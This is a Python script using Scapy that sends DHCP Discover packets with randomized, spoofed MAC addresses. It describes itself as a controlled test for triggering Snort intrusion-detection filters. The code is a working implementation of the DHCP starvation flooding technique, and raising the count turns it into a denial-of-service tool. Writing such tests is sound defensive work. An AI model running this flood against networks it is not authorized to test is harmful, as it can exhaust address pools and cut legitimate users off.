#!/usr/bin/env python3
"""
Controlled DHCP Flooding Test Script using Scapy.
Sends a specified number of DHCP Discover packets with randomized MACs
to safely trigger Snort detection filters without crashing the network.
"""
import sys
import time
import random

try:
    from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp
except ImportError:
    print("Scapy is not installed. Please use Yersinia or install python3-scapy.")
    sys.exit(1)

def random_mac():
    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0, 255) for _ in range(5))

def send_dhcp_flood(count=20, delay=0.1, iface="eth0"):
    print(f"[*] Sending {count} DHCP Discover packets on {iface} (interval: {delay}s)...")
    for i in range(count):
        mac = random_mac()
        chaddr = bytes.fromhex(mac.replace(":", "")) + b"\x00" * 10
        pkt = (
            Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
            IP(src="0.0.0.0", dst="255.255.255.255") /
            UDP(sport=68, dport=67) /
            BOOTP(op=1, chaddr=chaddr, xid=random.randint(1, 0xFFFFFFFF)) /
            DHCP(options=[("message-type", "discover"), "end"])
        )
        sendp(pkt, iface=iface, verbose=False)
        print(f"    [{i+1}/{count}] Sent DHCP Discover (spoofed MAC: {mac})")
        time.sleep(delay)
    print(f"[OK] Completed sending {count} packets.")

if __name__ == "__main__":
    count = int(sys.argv[1]) if len(sys.argv) > 1 else 20
    delay = float(sys.argv[2]) if len(sys.argv) > 2 else 0.1
    send_dhcp_flood(count=count, delay=delay)
